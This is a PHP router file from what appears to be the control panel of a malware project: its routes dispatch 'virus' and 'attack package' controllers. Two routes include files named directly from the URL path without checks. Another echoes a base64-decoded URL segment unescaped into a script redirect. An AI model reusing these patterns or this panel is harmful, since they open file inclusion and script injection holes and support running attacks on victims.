<?php /** @noinspection PhpIncludeInspection */

use Kelvinho\Virus\Singleton\Header;

$router->getPost("controller/*", function () use ($requestData, $authenticator, $session, $userFactory, $virusFactory, $attackFactory) {
    if (!$requestData->rightHost()) Header::notFound();
    include(__DIR__ . "/../controller/" . $requestData->getExplodedPath()[1] . ".php");
});
// added redirection on the 2nd exploded path
$router->get("controller/*/*", function () use ($requestData, $authenticator, $session, $userFactory, $virusFactory, $attackFactory) {
    if (!$requestData->rightHost()) Header::notFound();
    include(__DIR__ . "/../controller/" . $requestData->getExplodedPath()[1] . ".php"); ?>
    <script>window.location = "<?php echo base64_decode($requestData->getExplodedPath()[2]); ?>";</script><?php
});
// custom controllers that attack packages may need
$router->getPost("vrs/*/aks/*/ctrls/*", function () use ($requestData, $attackFactory, $authenticator) {
    $virus_id = $requestData->getExplodedPath()[1];
    $attack_id = $requestData->getExplodedPath()[3];
    if (!$authenticator->authorized($virus_id, $attack_id)) Header::forbidden();
    $attack = $attackFactory->get($attack_id);
    $attack->includeController($requestData->getExplodedPath()[5]);
});